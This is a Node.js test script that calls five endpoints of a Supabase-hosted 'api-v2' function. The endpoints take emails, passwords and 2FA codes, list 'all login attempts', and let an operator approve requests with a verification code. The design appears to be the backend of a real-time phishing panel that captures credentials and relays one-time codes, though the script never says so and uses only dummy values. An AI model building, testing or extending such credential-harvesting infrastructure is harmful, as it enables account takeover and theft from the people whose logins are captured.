const https = require('https');

console.log('🚀 COMPREHENSIVE TEST FOR API-V2');
console.log('=====================================\n');

const BASE_URL = 'https://nqsdardermkzppeaazbb.supabase.co/functions/v1/api-v2';

async function testAPI(url, method = 'GET', data = null) {
    return new Promise((resolve, reject) => {
        const postData = data ? JSON.stringify(data) : null;
        const options = {
            method: method,
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Test-Client'
            }
        };

        const req = https.request(url, options, (res) => {
            let responseData = '';
            
            res.on('data', (chunk) => {
                responseData += chunk;
            });
            
            res.on('end', () => {
                try {
                    const parsedData = JSON.parse(responseData);
                    resolve({
                        status: res.statusCode,
                        data: parsedData
                    });
                } catch (e) {
                    resolve({
                        status: res.statusCode,
                        data: responseData
                    });
                }
            });
        });

        req.on('error', (error) => {
            reject(error);
        });

        if (postData) {
            req.write(postData);
        }
        
        req.end();
    });
}

async function runTests() {
    // TEST 1: Root endpoint
    console.log('🧪 TEST 1: Root Endpoint');
    try {
        const result = await testAPI(BASE_URL + '/');
        console.log(`📊 Status: ${result.status}`);
        console.log(`📝 Response:`, result.data);
        console.log(result.status === 200 ? '✅ SUCCESS!\n' : '❌ FAILED!\n');
    } catch (error) {
        console.log('❌ ERROR:', error.message, '\n');
    }

    // TEST 2: Get requests endpoint
    console.log('🧪 TEST 2: Get Requests Endpoint');
    try {
        const result = await testAPI(BASE_URL + '/requests');
        console.log(`📊 Status: ${result.status}`);
        console.log(`📝 Response:`, result.data);
        console.log(result.status === 200 ? '✅ SUCCESS!\n' : '❌ FAILED!\n');
    } catch (error) {
        console.log('❌ ERROR:', error.message, '\n');
    }

    // TEST 3: Submit login data
    console.log('🧪 TEST 3: Submit Login Data');
    try {
        const testData = {
            email: 'test@example.com',
            password: 'testpassword123',
            twofa: '123456',
            userAgent: 'Test Agent',
            currentPage: 'Login'
        };
        
        const result = await testAPI(BASE_URL + '/submit', 'POST', testData);
        console.log(`📊 Status: ${result.status}`);
        console.log(`📝 Response:`, result.data);
        console.log(result.status === 200 ? '✅ SUCCESS!\n' : '❌ FAILED!\n');
    } catch (error) {
        console.log('❌ ERROR:', error.message, '\n');
    }

    // TEST 4: Check approval
    console.log('🧪 TEST 4: Check Approval');
    try {
        const result = await testAPI(BASE_URL + '/check-approval?email=test@example.com');
        console.log(`📊 Status: ${result.status}`);
        console.log(`📝 Response:`, result.data);
        console.log(result.status === 200 ? '✅ SUCCESS!\n' : '❌ FAILED!\n');
    } catch (error) {
        console.log('❌ ERROR:', error.message, '\n');
    }

    // TEST 5: Approve request (will fail without valid ID but should show proper error)
    console.log('🧪 TEST 5: Approve Endpoint');
    try {
        const approveData = {
            requestId: 999,
            status: 'approved',
            verificationCode: '123456'
        };
        
        const result = await testAPI(BASE_URL + '/approve', 'POST', approveData);
        console.log(`📊 Status: ${result.status}`);
        console.log(`📝 Response:`, result.data);
        console.log('✅ Endpoint exists (error expected for invalid ID)\n');
    } catch (error) {
        console.log('❌ ERROR:', error.message, '\n');
    }

    console.log('📋 SUMMARY:');
    console.log('- Root endpoint: API status check');
    console.log('- /requests: Get all login attempts');
    console.log('- /submit: Submit login data');
    console.log('- /check-approval: Check approval status');
    console.log('- /approve: Approve/deny requests');
    console.log('\n🎉 All endpoints tested!');
}

runTests().catch(console.error); 